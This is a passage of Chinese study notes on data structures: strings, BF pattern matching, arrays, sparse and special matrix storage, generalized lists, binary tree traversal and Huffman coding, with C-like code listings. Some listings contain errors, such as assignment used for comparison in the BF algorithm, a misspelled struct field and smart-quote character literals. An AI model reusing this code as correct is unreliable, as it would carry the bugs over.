id="4-3-1类型定义"><a href="#4-3-1类型定义" class="headerlink" title="4.3.1类型定义"></a>4.3.1类型定义</h3><p>ADT String {<br>    数据对象:…<br>    数据关系:…<br>    基本操作:<br>    (1) StrAssign (&amp;T,chars) &#x2F;&#x2F;串赋值<br>    (2) StrCompare (S,T) &#x2F;&#x2F;串比较<br>    (3) StrLength (S) &#x2F;&#x2F;求串长<br>    (4) Concat(&amp;T,S1,S2) &#x2F;&#x2F;串联<br>    (5) SubString(&amp;Sub,S,pos,len) &#x2F;&#x2F;求子串<br>    (6) StrCopy(&amp;T,S) &#x2F;&#x2F;串拷贝<br>    (7) StrEmpty(S) &#x2F;&#x2F;串判空<br>    (8) ClearString (&amp;S) &#x2F;&#x2F;清空串<br>    (9) Index(S,T,pos) &#x2F;&#x2F;子串的位置<br>    (11) Replace(&amp;S,T,V) &#x2F;&#x2F;串替换<br>    (12) StrInsert(&amp;S,pos,T) &#x2F;&#x2F;子串插入<br>    (12) StrDelete(&amp;S,pos,len) &#x2F;&#x2F;子串删除<br>    (13) DestroyString(&amp;S) &#x2F;&#x2F;串销毁<br>}ADT String</p><h3 id="4-3-2串的存储结构"><a href="#4-3-2串的存储结构" class="headerlink" title="4.3.2串的存储结构"></a>4.3.2串的存储结构</h3><p>顺序存储,链式存储</p><blockquote><p>串的定长顺序存储结构</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXLEN 255</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">char</span> ch[MAXLEN+<span class="number">1</span>]; <span class="comment">//存储串的一维数组</span></span><br><span class="line"><span class="type">int</span> length; <span class="comment">//串的当前长度</span></span><br><span class="line">&#125;SString;</span><br></pre></td></tr></table></figure><blockquote><p>串的堆式顺序存储结构</p></blockquote><p>设定固定串空间不尽合理，无法根据需要动态分配和释放字符数组空间，C语言中存在称为“堆”的自由存储区</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">char</span> *ch; <span class="comment">//若串非空,则按串长分配存储区,</span></span><br><span class="line"><span class="comment">//否则ch为NULL</span></span><br><span class="line"><span class="type">int</span> length; <span class="comment">//串长度</span></span><br><span class="line">&#125;HString;</span><br></pre></td></tr></table></figure><blockquote><p>串的链式存储结构</p></blockquote><p>链表存储串值时可能存在：每个节点存放一个字符或多个字<br>符的情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZE 80 <span class="comment">//可由用户定义的块大小</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Chunk</span>&#123;</span></span><br><span class="line"><span class="type">char</span> ch[CHUNKSIZE];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Chunk</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;Chunk;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">Chunk *head,*tail; <span class="comment">//串的头指针和尾指针</span></span><br><span class="line"><span class="type">int</span> curlen; <span class="comment">//串的当前长度</span></span><br><span class="line">&#125;LString;</span><br></pre></td></tr></table></figure><h3 id="4-3-3-串的模式匹配算法"><a href="#4-3-3-串的模式匹配算法" class="headerlink" title="4.3.3 串的模式匹配算法"></a>4.3.3 串的模式匹配算法</h3><blockquote><p>BF算法(重点)</p></blockquote><p><img src="/img/BF%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E6%80%9D%E6%83%B3.png" alt="BF算法设计思想"></p><p><em><strong>Index(S, T, pos)</strong></em></p><p>将主串S的第pos个字符和模式T的第1字符（j&#x3D;1）比较，若相等，继续逐个比较后续字符；若出现某个字符等，从主串的下一字符（i&#x3D;i-j+2）起，重新与模式的第一个字符（j&#x3D;1）比较。</p><p>直到主串的一个连续子串字符序列与模式相等 。<br>返回值为S中与T匹配的子序列第一个字符的序号， 即匹配成功。</p><p>否则，匹配失败，返回值 0</p><figure class="highlight c"><figcaption><span>BF算法描述</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Index</span><span class="params">(Sstring S, Sstring T, <span class="type">int</span> pos)</span>&#123;</span><br><span class="line">i=pos; j=<span class="number">1</span>; <span class="comment">//初始化</span></span><br><span class="line"><span class="keyword">while</span> (i&lt;=S.length &amp;&amp; j &lt;=T.length) <span class="comment">//两个串均未比较到串尾</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( S[ i ]=T[ j ]) &#123;++i; ++j; &#125; <span class="comment">//继续比较后续字符</span></span><br><span class="line"><span class="keyword">else</span>&#123; i=i-j+<span class="number">2</span>; j=<span class="number">1</span>; &#125; <span class="comment">//指针后退重新开始匹配</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( j&gt;T.length) <span class="keyword">return</span> i－T.length; <span class="comment">//匹配成功，返回位置</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//匹配失败</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心：理解匹配失败后主串下一个位置</p><p>最好情况: 算法复杂度O(n+m)</p><p>最坏情况:总次数为：(n-m)*m+m＝(n-m+1)<em>m; 若m&lt;&lt;n，则算法复杂度O(n</em>m)</p><blockquote><p>KMP算法</p></blockquote><p><img src="/img/KMP%E7%AE%97%E6%B3%95.jpg" alt="KMP算法"></p><h2 id="4-4数组"><a href="#4-4数组" class="headerlink" title="4.4数组"></a>4.4数组</h2><h3 id="4-4-1类型定义"><a href="#4-4-1类型定义" class="headerlink" title="4.4.1类型定义"></a>4.4.1类型定义</h3><p>ADT  Array {<br>    数据对象:…<br>    数据关系:…<br>    基本操作:<br>    (1) InitArray (&amp;A,n,bound1, boundn) &#x2F;&#x2F;构造数组A<br>    (2) DestroyArray (&amp;A) &#x2F;&#x2F; 销毁数组A<br>    (3) Value(A,&amp;e,index1,…,indexn) &#x2F;&#x2F;取数组元素值<br>    (4) Assign (A,&amp;e,index1,…,indexn) &#x2F;&#x2F;给数组元素赋值<br>}ADT  Array</p><p><img src="/img/%E6%95%B0%E7%BB%84.jpg" alt="数组"></p><p>二维数组常用：<br><em>LOC ( i, j ) &#x3D; a + (i * n + j)<em>L</em></em></p><h3 id="4-4-2特殊矩阵的压缩存储"><a href="#4-4-2特殊矩阵的压缩存储" class="headerlink" title="4.4.2特殊矩阵的压缩存储"></a>4.4.2特殊矩阵的压缩存储</h3><p>什么是压缩存储？</p><p>若多个数据元素的值都相同，则只分配一个元素值的存储空间，且零元素不占存储空间。</p><p>什么样的矩阵能够压缩？</p><p>一些特殊矩阵，如：对称矩阵，对角矩阵，三角矩阵，稀疏矩阵等。</p><p>什么叫稀疏矩阵？</p><p>矩阵中非零元素的个数较少（一般小于5%）</p><ol><li><p>对称矩阵<br>[特点]:在n×n的矩阵A中，满足如下性质：aij&#x3D;aji (1 ≤ i, j ≤ n)<br><br><br>[存储方法]: 只存储下(或者上)三角(包括主对角线)的数据元素。共占用n(n+1)&#x2F;2个元素空间。<br><br><img src="https://www.helloimg.com/images/2022/10/30/ZVg8xm.md.png" alt="对称矩阵"></p></li><li><p>三角矩阵<br>[特点]:对角线以下(或者以上)的数据元素(不包括对角线)全部为常数c。<br><br><br><a href="%E4%BB%A5%E5%AF%B9%E8%A7%92%E7%BA%BF%E7%9A%84%E9%A1%BA%E5%BA%8F%E5%AD%98%E5%82%A8%E5%88%B0%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%8A"> 存储方法</a>: 重复元素c共享一个元素存储空间，共占用n(n+1)&#x2F;2+1个元素空间: sa[0.. n(n+1)&#x2F;2]<br><img src="https://www.helloimg.com/images/2022/10/30/ZVgKWh.md.png" alt="三角矩阵"></p></li><li><p>对角矩阵（带状矩阵）<br>   [ 特点]:在n×n的方阵中，非零元素集中在主对角线及其两侧共L(奇数)条对角线的带状区域内 — L对角矩阵。</p></li></ol><p>   <img src="https://www.helloimg.com/images/2022/10/30/ZVgUgc.md.png" alt="对角矩阵（带状矩阵）"></p><ol start="4"><li>稀疏矩阵<br>   [ 特点]:大多数元素为零。</li></ol><p>   <a href="%E4%BB%A5%E5%AF%B9%E8%A7%92%E7%BA%BF%E7%9A%84%E9%A1%BA%E5%BA%8F%E5%AD%98%E5%82%A8%E5%88%B0%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%8A"> 存储方法</a>: 只记录每一非零元素(i, j, aij ) 节省空间，但丧失随机存取功能</p><p>   <img src="https://www.helloimg.com/images/2022/10/30/ZVgkaq.md.png" alt="稀疏矩阵"></p><h2 id="4-5广义表"><a href="#4-5广义表" class="headerlink" title="4.5广义表"></a>4.5广义表</h2><p>广义表（线性表的推广，也称为列表）： n ( 0 )个表元素组成的有限序列，记作LS &#x3D; (a0, a1, a2, …, an-1)</p><p>LS是表名。<br>ai是表元素，它可以是表 (称为子表)，可以是数据元素(称为原子)。<br>n为表的长度。n &#x3D; 0 的广义表为空表。</p><blockquote><p>广义表与线性表的区别？</p></blockquote><ol><li>线性表的成分都是结构上不可分的单元素</li><li>广义表的成分可以是单元素，也可以是有结构的表</li><li>线性表是一种特殊的广义表</li><li>广义表不一定是线性表，也不一定是线性结构！</li></ol><blockquote><p>广义表的基本运算</p></blockquote><ol><li>求表头GetHead(L):非空广义表的第一个元素，可以是一个单元素，也可以是一个子表求表尾</li><li>求表尾GetTail(L):非空广义表除去表头元素以外其它元素所构成的表。<strong>表尾一定是一个表</strong></li></ol><blockquote><p>广义表的特点</p></blockquote><ol><li>有次序性 一个直接前驱和一个直接后继</li><li>有长度 ＝表中元素个数</li><li>有深度 ＝表中括号的重数</li><li>可递归 自己可以作为自己的子表</li><li>可共享 可以为其他广义表所共享</li></ol><h2 id="4-6案例分析与实现"><a href="#4-6案例分析与实现" class="headerlink" title="4.6案例分析与实现"></a>4.6案例分析与实现</h2><p>略QWQ</p><h1 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h1><h2 id="5-1树和二叉树的定义"><a href="#5-1树和二叉树的定义" class="headerlink" title="5.1树和二叉树的定义"></a>5.1树和二叉树的定义</h2><h2 id="5-1-1树的定义"><a href="#5-1-1树的定义" class="headerlink" title="5.1.1树的定义"></a>5.1.1树的定义</h2><p>树（Tree）是n（n≥0）个结点的有限集，它或为空树（n &#x3D; 0）；或为非空树，对于非空树 T：</p><pre><code>    有且仅有一个称之为根的结点；    除根结点以外的其余结点可分为m（m＞0） 个互不相交的有限集T1, T2, …, Tm, 其中每一    个集合本身又是一棵树，并且称为根的子树（SubTree）。</code></pre><h2 id="5-1-2基本术语"><a href="#5-1-2基本术语" class="headerlink" title="5.1.2基本术语"></a>5.1.2基本术语</h2><p>根 ——即根结点(没有前驱)</p><p>叶子 ——即终端结点(没有后继)</p><p>森林 ——指m棵不相交的树的集合(例如删除A后的子树个数)</p><p>有序树 ——结点各子树从左至右有序，不能互换（左为第一）</p><p>无序树 ——结点各子树可互换位置。</p><p>双亲 ——即上层的那个结点(直接前驱)</p><p>孩子 ——即下层结点的子树的根(直接后继)</p><p>兄弟 ——同一双亲下的同层结点（孩子之间互称兄弟）</p><p>堂兄弟 ——即双亲位于同一层的结点（但并非同一双亲）</p><p>祖先 ——即从根到该结点所经分支的所有结点</p><p>子孙 ——即该结点下层子树中的任一结点</p><p>结点 ——即树的数据元素</p><p>结点的度 ——结点拥有的子树数</p><p>结点的层次 ——从根到该结点的层数（根结点算第一层）</p><p>终端结点 ——即度为0的结点，即叶子</p><p>分支结点 ——即度不为0的结点（也称为内部结点）</p><p>树的度 ——树内各结点度的最大值</p><p>树的深度(或高度)——树中节点的最大层次数结</p><h2 id="5-1-3二叉树的定义"><a href="#5-1-3二叉树的定义" class="headerlink" title="5.1.3二叉树的定义"></a>5.1.3二叉树的定义</h2><p>二叉树（Binary Tree）是n（n≥0）个结点所构成的集合，它或为空树（n &#x3D; 0）；或为非空树，对于非空树T：</p><ol><li>有且仅有一个称之为根的结点；</li><li>除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别称为T的左子树和右子树，且T1和T2本身又都是二叉树。</li></ol><p>二叉树基本特点： • 结点的度小于等于2 • 有序树（子树有序，不能颠倒）</p><h2 id="5-2案例引入"><a href="#5-2案例引入" class="headerlink" title="5.2案例引入"></a>5.2案例引入</h2><h2 id="5-3树和二叉树的抽象数据类型定义"><a href="#5-3树和二叉树的抽象数据类型定义" class="headerlink" title="5.3树和二叉树的抽象数据类型定义"></a>5.3树和二叉树的抽象数据类型定义</h2><h2 id="5-4二叉树的性质和存储结构"><a href="#5-4二叉树的性质和存储结构" class="headerlink" title="5.4二叉树的性质和存储结构"></a>5.4二叉树的性质和存储结构</h2><h2 id="5-5遍历二叉树和线索二叉树"><a href="#5-5遍历二叉树和线索二叉树" class="headerlink" title="5.5遍历二叉树和线索二叉树"></a>5.5遍历二叉树和线索二叉树</h2><h3 id="5-5-1-遍历规则："><a href="#5-5-1-遍历规则：" class="headerlink" title="5.5.1 遍历规则："></a>5.5.1 遍历规则：</h3><p>限定先左后右，则只有前3种情况，分别称之为先（根） 序遍历、中（根） 序遍历和后（根）序遍历</p><blockquote><p>先序遍历算法</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">PreOrderTraverse</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> OK; <span class="comment">//空二叉树</span></span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;T-&gt;data; <span class="comment">//访问根结点</span></span><br><span class="line">PreOrderTraverse(T-&gt;lchild); <span class="comment">//递归遍历左子树</span></span><br><span class="line">PreOrderTraverse(T-&gt;rchild); <span class="comment">//递归遍历右子树</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>中序遍历算法</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">InOrderTraverse</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> OK; <span class="comment">//空二叉树</span></span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">InOrderTraverse(T-&gt;lchild); <span class="comment">//递归遍历左子树</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;T-&gt;data; <span class="comment">//访问根结点</span></span><br><span class="line">InOrderTraverse(T-&gt;rchild); <span class="comment">//递归遍历右子树</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>后序遍历算法</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">PostOrderTraverse</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> OK; <span class="comment">//空二叉树</span></span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">PostOrderTraverse(T-&gt;lchild); <span class="comment">//递归遍历左子树</span></span><br><span class="line">PostOrderTraverse(T-&gt;rchild); <span class="comment">//递归遍历右子树</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;T-&gt;data; <span class="comment">//访问根结点</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果去掉输出语句，从递归的角度看，三种算法是完全<br>相同的，或说这三种算法的访问路径是相同的，只是访<br>问结点的时机不同。</li><li>时间效率:O(n)&#x2F;&#x2F;每个结点只访问一次</li><li>空间效率:O(n)&#x2F;&#x2F;栈占用的最大辅助空间（树的深度，最坏情况为n）</li></ul><h3 id="5-5-2二叉树的建立："><a href="#5-5-2二叉树的建立：" class="headerlink" title="5.5.2二叉树的建立："></a>5.5.2二叉树的建立：</h3><blockquote><p>递归算法</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> CreateBiTree （BiTree &amp;T）&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;ch; <span class="comment">//接受输入</span></span><br><span class="line"><span class="keyword">if</span> (ch==’#’) T=<span class="literal">NULL</span>; <span class="comment">//递归结束，建空树</span></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">T=new BiTNode; </span><br><span class="line">T-＞data=ch; <span class="comment">//生成根结点</span></span><br><span class="line">CreateBiTree(T-＞lchild); <span class="comment">//递归创建左子树</span></span><br><span class="line">CreateBiTree(T-＞rchild); <span class="comment">//递归创建右子树</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>计算二叉树结点总数</p></blockquote><ul><li>如果是空树，则结点个数为0；</li><li>否则，结点个数为左子树的结点个数+右子树的结点个数再+1。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">NodeCount</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (T == <span class="literal">NULL</span> ) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//如果空树，则节点个数为0，</span></span><br><span class="line">递归结束</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> NodeCount(T-&gt;lchild)+NodeCount(T-&gt;rchild)+<span class="number">1</span>;</span><br><span class="line"><span class="comment">//否则节点个数为左子树的节点个数+右子树的节点个数</span></span><br><span class="line">+<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>计算二叉树深度</p></blockquote><ul><li>如果是空树，则深度为0；</li><li>否则，递归计算左子树的深度记为m，递归计算右子树的深度记为n，二叉树的深度则为m与n的较大者加1。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Depth</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line"><span class="comment">//树的深度</span></span><br><span class="line"><span class="keyword">if</span>(T==<span class="literal">NULL</span>) </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//如果空树，深度为0</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="type">int</span> m=Depth(T-&gt;lchild); <span class="comment">//递归计算左子树深度为m</span></span><br><span class="line"><span class="type">int</span> n=Depth(T-&gt;rchild); <span class="comment">//递归计算右子树深度为n</span></span><br><span class="line"><span class="keyword">if</span>(m&gt;n) </span><br><span class="line"><span class="keyword">return</span> (m+<span class="number">1</span>); <span class="comment">//m和n较大者+1</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"><span class="keyword">return</span> (n+<span class="number">1</span>); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>重要结论:若二叉树中各结点的值均不相同，则：由二叉树的前序序列和中序序列，或由其后序序列和中序序列均能唯一地确定一棵二叉树，但由前序序列和后序序列却不一定能唯一地确定一棵二叉树。</code></pre><h3 id="5-5-3-线索化二叉树："><a href="#5-5-3-线索化二叉树：" class="headerlink" title="5.5.3 线索化二叉树："></a>5.5.3 线索化二叉树：</h3><p>普通二叉树只能找到结点的左右孩子信息，而该结点的直接前驱和直接后继只能在遍历过程中获得<br>若将遍历后对应的有关前驱和后继预存起来，则从第一个结点开始就能很快“顺藤摸瓜”而遍历整个树</p><p>线索二叉树构造的实质是将二叉链表中的空指针改为前驱或后继的线索，线索化的过程即是遍历过程中修改空指针<br>的过程！</p><ul><li>线索二叉树：构造的实质是在二叉树（图形式样）上加上线索信息（一般用虚线来表示）</li><li>线索链表：将二叉链表中的空指针改为前驱或后继的线索，<br>线索化的过程即是遍历过程中修改空指针的过程！</li></ul><h2 id="5-6树和森林"><a href="#5-6树和森林" class="headerlink" title="5.6树和森林"></a>5.6树和森林</h2><p>以一组连续的存储单元存储树的结点，每个结点除了数据域data外，还附设一个parent域用以指示其双亲结点的位置<br>优缺点：<br>求结点的双亲和树的根十分方便， 但求结点的孩子时需要遍历整个结构</p><p><img src="https://www.helloimg.com/image/oR0tQu" alt="树和森林"></p><h2 id="5-7哈夫曼树及其应用"><a href="#5-7哈夫曼树及其应用" class="headerlink" title="5.7哈夫曼树及其应用"></a>5.7哈夫曼树及其应用</h2><h3 id="5-7-1-哈夫曼树的构造："><a href="#5-7-1-哈夫曼树的构造：" class="headerlink" title="5.7.1 哈夫曼树的构造："></a>5.7.1 哈夫曼树的构造：</h3><p>基本思想：使权大的结点靠近根<br>操作要点：对权值的合并、删除与替换，总是合并当前值最小的两个</p><p><strong>哈夫曼树的构造过程</strong>：</p><ul><li>第一步：根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。</li><li>第二步：在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。</li><li>第三步：在森林中删除这两棵树，同时将新得到的二叉树加入森林中。重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。</li></ul><p><strong>哈夫曼树构造算法的实现</strong>：</p><figure class="highlight c"><figcaption><span>结点类型定义</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line"><span class="type">int</span> weght; <span class="comment">//结点的权值</span></span><br><span class="line"><span class="type">int</span> parent, lch, rch; <span class="comment">//结点的双亲、左孩子、右孩子</span></span><br><span class="line">的下标</span><br><span class="line">&#125;*HuffmanTree; <span class="comment">//动态分配数组存储哈夫曼树</span></span><br></pre></td></tr></table></figure><p>数组[0…2n-1]的0号单元不使用，从1号单元开始使用，叶子<br>结点集中存储在前面部分l~n 个位置，而后面的n-1 个位置存<br>储其余非叶子结点</p><figure class="highlight c"><figcaption><span>初始化</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreatHuffmanTree</span> <span class="params">(HuffmanTree HT, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (n&lt;=<span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">m=<span class="number">2</span>*n<span class="number">-1</span>;</span><br><span class="line">HT=new HTNode[m+<span class="number">1</span>]; <span class="comment">//0号单元未用，HT[m]表示根结点</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=m; ++i)</span><br><span class="line">&#123; <span class="comment">//l~m号单元中的双亲、左孩子，右孩子的下标都初始化为0</span></span><br><span class="line">HT[i].lch=<span class="number">0</span>; HT[i].rch=<span class="number">0</span>; HT[i].parent=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;++i) <span class="comment">//输人前n 个单元中叶子结点的权值</span></span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;HT[i].weight;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造 Huffman树</span></span><br><span class="line"><span class="keyword">for</span> (i=n+<span class="number">1</span>; i&lt;=m; ++i) </span><br><span class="line">&#123; Select (HT,i<span class="number">-1</span>, s1, s2);</span><br><span class="line">    <span class="comment">//在HT[k](1≤k≤i-1)中选择两个其双亲域为0,</span></span><br><span class="line">    <span class="comment">// 且权值最小的结点,</span></span><br><span class="line">    <span class="comment">// 并返回它们在HT中的序号s1和s2</span></span><br><span class="line">    HT[s1].parent=i; HT[s2] .parent=i; </span><br><span class="line">    <span class="comment">//表示从F中删除s1,s2</span></span><br><span class="line">    HT[i].lch=s1; HT[i].rch=s2 ; </span><br><span class="line">    <span class="comment">//s1,s2分别作为i的左右孩子</span></span><br><span class="line">    HT[i].weight=HT[s1].weight + HT[s2] .weight;</span><br><span class="line">    <span class="comment">//i 的权值为左右孩子权值之和</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-7-2-哈夫曼编码"><a href="#5-7-2-哈夫曼编码" class="headerlink" title="5.7.2 哈夫曼编码"></a>5.7.2 哈夫曼编码</h3><p><strong>基本思想</strong>：为出现次数较多的字符编以较短的编码。为确保对数据文件进行 <strong>有效的压缩和对压缩文件进行正确的解码</strong>，可以利用哈夫曼树来设计二进制编码。</p><p>哈夫曼树中，约定左分支标记为0，右分支标记为l，则根结点到每个叶子结点路径上的0、l序列即为相应字符的编码。</p><p><strong>前缀编码</strong>：一个编码方案中，任一个编码都不是其他任<br>何编码的前缀（最左子串），则称编码是前缀编码，可<br>以保证对压缩文件进行解码时不产生二义性， 确保正确<br>解码。</p><p>哈夫曼树中，约定左分支标记为0, 右分支标记为l,则根结<br>点到每个叶子结点路径上的0、l序列即为相应字符的编码。</p><p><strong>哈夫曼编码</strong>：对一棵具有n个叶子的哈夫曼树，若对树中<br>的每个左分支赋予0, 右分支赋予1，则从根到每个叶子的<br>路径上，各分支的赋值分别构成一个二进制串， 该二进<br>制串就称为哈夫曼编码</p><figure class="highlight c"><figcaption><span>哈夫曼编码构造算法的实现</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreatHuffmanCode</span><span class="params">(HuffmanTree HT, HuffmanCode &amp;HC, <span class="type">int</span> n)</span>&#123;</span><br><span class="line"><span class="comment">//从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中</span></span><br><span class="line">HC=new <span class="type">char</span> *[n+<span class="number">1</span>]; <span class="comment">//分配n个字符编码的头指针矢量</span></span><br><span class="line">cd=new <span class="type">char</span> [n]; <span class="comment">//分配临时存放编码的动态数组空间</span></span><br><span class="line">cd[n<span class="number">-1</span>]=’\<span class="number">0</span>’; <span class="comment">//编码结束符</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=n; ++i)&#123; <span class="comment">//逐个字符求赫夫曼编码</span></span><br><span class="line">start=n<span class="number">-1</span>; c=i; f=HT[i].parent; </span><br><span class="line"><span class="keyword">while</span>(f!=<span class="number">0</span>)&#123; <span class="comment">//从叶子结点开始向上回溯，直到根结点</span></span><br><span class="line">--start; <span 